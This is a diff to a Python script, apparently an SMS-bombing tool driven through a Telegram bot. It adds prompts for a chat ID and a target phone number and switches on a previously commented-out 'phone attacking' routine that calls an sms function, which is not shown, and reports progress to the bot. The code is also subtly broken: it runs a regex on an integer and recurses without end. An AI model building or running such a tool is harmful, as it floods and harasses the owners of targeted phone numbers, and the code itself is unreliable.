@@ -32,6 +32,7 @@ art.tprint('AMINRNGBR1122 FROM GITHUB')
 
 # ? Get token
 token = input('\n \n Token : \n')
+idd = int(input('\n Chat_id : \n \n'))
 url = f'https://api.telegram.org/bot{token}/'
 clear()
 print(f'\n Login to telegram token : {token} \n \n pls wait ... \n \n')
@@ -70,23 +71,18 @@ def send(url, chat_id, params):
     requests.post(url+'sendmessage', data=par)
 
 
-def main(url):
-    while True:
-        idd = last_update(url)['update_id']
-        update = last_update(url)
-        if idd == update['update_id']:
-            send(url, get_chat_id(update), get_message_text(update))
-#         try:
-#             rrr = False
-#             rrr = int(get_message_text(update))
-#         except:
-#             pass
-#         if rrr:
-#             send(url, get_chat_id(update), 'pls wait ...')
-#             sleep(2)
-#             send(url, get_chat_id(update), 'While attacking the desired target, please wait and don,t send msg...')
-#             sms(get_message_text(update), get_message_text(update))
-#             send(url, get_chat_id(update), 'End phone attacking ...')
-
+def main(url, idd):
+    phone = int(input('\n phone : \n'))
+    if match('0(.*)[11]', phone):
+        send(url, idd, 'pls wait ...')
+        sleep(2)
+        send(url, idd, 'While attacking the desired target, please wait and don,t send msg...')
+        sms(phone, phone)
+        send(url, idd, 'End phone attacking ...')
+        main(url, idd)
+    else:
+        send(url, idd, 'Error !')
+        main(url, idd)
+        
 if __name__ == '__main__':
-    main(url)
+    main(url, idd)
